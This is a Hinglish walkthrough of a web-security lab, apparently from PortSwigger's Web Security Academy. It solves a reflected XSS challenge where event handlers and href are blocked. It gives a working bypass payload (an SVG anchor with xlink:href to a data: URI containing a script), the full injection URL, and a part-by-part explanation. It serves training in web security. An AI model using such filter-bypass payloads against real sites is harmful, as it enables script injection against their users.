# 🚨 Lab: Reflected XSS with event handlers and `href` attributes blocked

## 🎯 Lab Objective:

Lab mein reflected XSS vulnerability hai. Lekin twist yeh hai:

* ✅ Kuch tags jaise `<svg>`, `<a>` allowed hain
* ❌ All event handlers (like `onclick`) blocked
* ❌ Anchor tag ka `href` attribute bhi blocked hai
* ✅ Victim ko "Click" text pe click karna chahiye taake alert fire ho

---

## 🧪 Lab Test Setup:

Lab URL kuch aise hota hai:

```
https://YOUR-LAB-ID.web-security-academy.net/?search=
```

Is URL ke `search` parameter mein jo input doge woh HTML page par render hoga. Iska matlab tu injection kar sakta hai — lekin filters lagaaye gaye hain.

---

## ✅ Working XSS Payload:

```
<svg><a xlink:href=data:text/html,<script>alert(1)</script>>Click</a>
```

---

## 🔍 Payload Breakdown:

| Part                        | Explanation                                           |
| --------------------------- | ----------------------------------------------------- |
| `<svg>`                     | Safe tag, allow hai                                   |
| `<a>`                       | Anchor tag, jisme click hone ka action hota hai       |
| `xlink:href`                | SVG specific href attribute, `href` ka bypass version |
| `data:text/html,...`        | Data URI format jisme inline HTML diya ja sakta hai   |
| `<script>alert(1)</script>` | Actual XSS payload jo alert fire karega               |
| `Click`                     | Text jisko victim click karega                        |

---

## 📲 Steps to Solve:

1. Lab ka URL open karo
2. Paste full payload:

```
https://YOUR-LAB-ID.web-security-academy.net/?search=<svg><a xlink:href=data:text/html,<script>alert(1)</script>>Click</a>
```

3. "Click" text page par show hoga
4. Victim simulator click karega
5. `alert(1)` fire hone ke baad lab complete ho jayega ✅

---

## 🎭 Real Life Example:

Socho tu ek **gift box** banata hai jisme likha hota hai "Click Me", lekin us box ke andar chhupa hota hai **patakha (XSS payload)**. Jaise hi banda click karta hai, **patakha phat jata hai (alert run hota hai)**.

---

## ❓ Why `xlink:href` works?

* Jab browser `<svg>` ke andar `<a>` tag dekh ta hai
* Aur usmein `xlink:href` diya hota hai, toh woh usse ek external file samajhta hai
* Agar `data:` URI diya ho, toh browser us content ko render karta hai
* Aur agar woh HTML hai jisme `<script>` ho — toh script execute ho jaata hai!

---

## ⚠️ Real World Note:

* Yeh trick **tabhi chalti hai jab CSP (Content Security Policy)** loose ya disabled ho
* Strict CSP websites mein yeh payload kaam nahi karega
